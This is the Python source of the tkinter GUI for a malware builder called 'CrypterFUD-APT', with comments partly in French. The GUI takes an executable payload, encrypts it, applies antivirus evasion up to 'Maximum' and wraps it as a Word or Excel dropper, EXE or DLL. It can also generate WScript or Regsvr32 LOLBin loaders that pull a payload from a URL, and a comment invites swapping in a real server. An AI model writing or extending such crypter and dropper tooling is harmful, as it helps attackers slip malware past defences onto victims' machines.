# =======================
# GUI - Interface Principale
# =======================

# gui/main_gui.py
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.dispatcher import BuildDispatcher
from core.logger import Logger
from documents.word_dropper.generate_doc import WordDropperGenerator

class CrypterGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("CrypterFUD-APT v1.0")
        self.root.geometry("800x600")
        self.root.configure(bg='#2b2b2b')
        
        self.payload_path = tk.StringVar()
        self.output_dir = tk.StringVar(value="./output")
        self.encryption_method = tk.StringVar(value="AES-GCM")
        self.evasion_level = tk.StringVar(value="High")
        self.target_format = tk.StringVar(value="Word Document")
        self.loader_type = tk.StringVar(value="Aucun")
        
        self.setup_ui()
        
    def setup_ui(self):
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), background='#2b2b2b', foreground='white')
        
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_label = ttk.Label(main_frame, text="CrypterFUD-APT Builder", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Payload selection
        payload_frame = ttk.LabelFrame(main_frame, text="Payload Configuration")
        payload_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(payload_frame, text="Select Payload:").pack(anchor=tk.W, padx=10, pady=5)
        payload_entry_frame = ttk.Frame(payload_frame)
        payload_entry_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Entry(payload_entry_frame, textvariable=self.payload_path, width=60).pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(payload_entry_frame, text="Browse", command=self.browse_payload).pack(side=tk.RIGHT, padx=(10, 0))
        
        # Encryption options
        crypto_frame = ttk.LabelFrame(main_frame, text="Encryption Settings")
        crypto_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(crypto_frame, text="Encryption Method:").pack(anchor=tk.W, padx=10, pady=5)
        crypto_combo = ttk.Combobox(crypto_frame, textvariable=self.encryption_method, 
                                   values=["AES-GCM", "AES-CBC+XOR", "ChaCha20", "Triple Layer"])
        crypto_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        # Evasion options
        evasion_frame = ttk.LabelFrame(main_frame, text="Evasion Techniques")
        evasion_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(evasion_frame, text="Evasion Level:").pack(anchor=tk.W, padx=10, pady=5)
        evasion_combo = ttk.Combobox(evasion_frame, textvariable=self.evasion_level,
                                    values=["Basic", "Medium", "High", "Maximum"])
        evasion_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        # Output format
        format_frame = ttk.LabelFrame(main_frame, text="Output Format")
        format_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(format_frame, text="Target Format:").pack(anchor=tk.W, padx=10, pady=5)
        format_combo = ttk.Combobox(format_frame, textvariable=self.target_format,
                                   values=["Word Document", "Excel Document", "Standalone EXE", "DLL"])
        format_combo.pack(anchor=tk.W, padx=10, pady=5)

        # LOLBAS Loader
        loader_frame = ttk.LabelFrame(main_frame, text="LOLBin Loader (optional)")
        loader_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(loader_frame, text="Technique de Loader :").pack(anchor=tk.W, padx=10, pady=5)
        loader_combo = ttk.Combobox(loader_frame, textvariable=self.loader_type,
                                   values=["Aucun", "WScript", "Regsvr32"])
        loader_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        # Output directory
        output_frame = ttk.LabelFrame(main_frame, text="Output Directory")
        output_frame.pack(fill=tk.X, pady=(0, 10))
        
        output_entry_frame = ttk.Frame(output_frame)
        output_entry_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Entry(output_entry_frame, textvariable=self.output_dir, width=60).pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(output_entry_frame, text="Browse", command=self.browse_output).pack(side=tk.RIGHT, padx=(10, 0))
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(10, 0))
        
        # Build button
        build_btn = ttk.Button(main_frame, text="Build Crypter", command=self.build_crypter)
        build_btn.pack(pady=20)
        
        # Log area
        log_frame = ttk.LabelFrame(main_frame, text="Build Log")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = tk.Text(log_frame, height=10, bg='black', fg='green', font=('Consolas', 9))
        scrollbar = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=10)
        
    def browse_payload(self):
        filename = filedialog.askopenfilename(
            title="Select Payload",
            filetypes=[("Executable files", "*.exe"), ("DLL files", "*.dll"), ("All files", "*.*")]
        )
        if filename:
            self.payload_path.set(filename)
            
    def browse_output(self):
        dirname = filedialog.askdirectory(title="Select Output Directory")
        if dirname:
            self.output_dir.set(dirname)
            
    def log_message(self, message):
        self.log_text.insert(tk.END, f"{message}\n")
        self.log_text.see(tk.END)
        self.root.update()
        
    def build_crypter(self):
        if not self.payload_path.get():
            messagebox.showerror("Error", "Please select a payload file")
            return
            
        self.progress.start()
        self.log_text.delete(1.0, tk.END)
        
        try:
            # Configuration du build
            config = {
                'payload_path': self.payload_path.get(),
                'output_dir': self.output_dir.get(),
                'encryption_method': self.encryption_method.get(),
                'evasion_level': self.evasion_level.get(),
                'target_format': self.target_format.get()
            }
            
            self.log_message("Starting build process...")
            
            # Utilisation du dispatcher
            dispatcher = BuildDispatcher(config, self.log_message)
            success, output_path = dispatcher.build_all()
            
            if success:
                self.log_message(f"Build completed successfully!")
                self.log_message(f"Output: {output_path}")
                
                # Loader LOLBAS (optionnel)
                loader_type = self.loader_type.get()
                if loader_type != "Aucun":
                    self.log_message(f"📦 Génération loader LOLBAS ({loader_type})...")
                    try:
                        from modules.loaders.wscript_loader import WScriptLoader
                        from modules.loaders.regsvr32_loader import Regsvr32Loader
                        
                        if loader_type == "WScript":
                            WScriptLoader().generate_loader(output_path, self.output_dir.get())
                            self.log_message("✅ Loader WScript (.vbs) généré.")
                        elif loader_type == "Regsvr32":
                            # ⚠️ Change cette URL si tu veux un vrai serveur HTTP
                            Regsvr32Loader().generate_loader("http://127.0.0.1/payload.exe", self.output_dir.get())
                            self.log_message("✅ Loader Regsvr32 (.sct) généré.")
                    except Exception as e:
                        self.log_message(f"❌ Erreur génération loader : {e}")
            else:
                self.log_message("Build failed!")
                messagebox.showerror("Error", "Build process failed. Check the log for details.")
                
        except Exception as e:
            self.log_message(f"Error: {str(e)}")
            messagebox.showerror("Error", f"An error occurred: {str(e)}")
        finally:
            self.progress.stop()
            
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = CrypterGUI()
    app.run()
